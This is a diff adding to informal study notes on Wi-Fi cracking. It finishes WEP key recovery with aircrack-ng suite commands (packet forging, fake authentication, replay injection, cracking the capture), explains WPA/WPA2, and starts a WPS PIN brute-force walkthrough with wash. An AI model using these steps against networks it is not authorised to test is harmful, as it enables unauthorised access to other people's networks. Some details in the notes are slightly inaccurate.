@@ -229,5 +229,31 @@ cmd in terminal 3 again -> packetforge-ng -0 -a target_network_bssid -h MAC_addr
                           -l 255.255.255.255 -y keystreamfile_obtained_by_chopchop_attack -w name_of_the_forged_packet
 cmd in terminal 2 again -> aireplay-ng --fakeauth 0 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0
 cmd in terminal 3 again -> aireplay-ng -2 -r name_of_the_forged_packet wlan0 // here -2 is for replay and this will inject the packet
+// it will ask u while execution if u want to use this packet so enter 'y' for yes
+cmd in terminal 2 again ->aircrack-ng file_name-01.cap //this will say in output as the key is found
 
+WPA/WPA2 Cracking ->
+Both of them WPA and WPA2 r very similar, both can be cracked using the same methods, the only difference is that the encryption
+used to ensure the msg integrity as WPA uses the TKIP and WPA2 uses the CCNP
+WPA and WPA2 both come after WEP and they were designed to address weaknessess in WEP hence they r more secure
 
+This WPS feature, if enabled and misconfigured can be exploited to recover the key without cracking the actual encryption
+
+WPS allows devices to connect to network easily without having to enter the key for the network, So it was actually designed to simplify
+the process of connecting printers and such devices, U can actually see the WPS button on most wireless enabled printers
+- IF this button on printer or device is presses and then press the WPS button on router, u will notice the printer will get connect
+to the router without u having to enter the key, this way the authentication is done using an eight digit pin which could be considered
+as a password which is made of only numbers and the length of this password is only 8.
+
+So this actually gives us a releatively small list of possible passwords and we can try all these passwords in a relatively short time
+
+Once we get this pin it can be used to recover actuall WPA or WPA2 key. So we r here exploiting a feature that can be enabled on these
+encryptions, So this to work 1st we need WPS to be enabled on the network and also it needs to be misconfigured, So it needs to be
+configured as the normal pin authentication and not a push button authentication.
+If the push button authentication is used then the router will refuse any pins that we try unless the WPS button is pressed on the
+router. So in most modern routers the WPS will be disabled by default, but still it is always a gud idea to check if the WPS is 
+enabled and try it.
+
+Exploiting the WPS ->
+- enable the monitor mode on the wireless adapter
+- wash // this will show all the networks which have WPS enabled
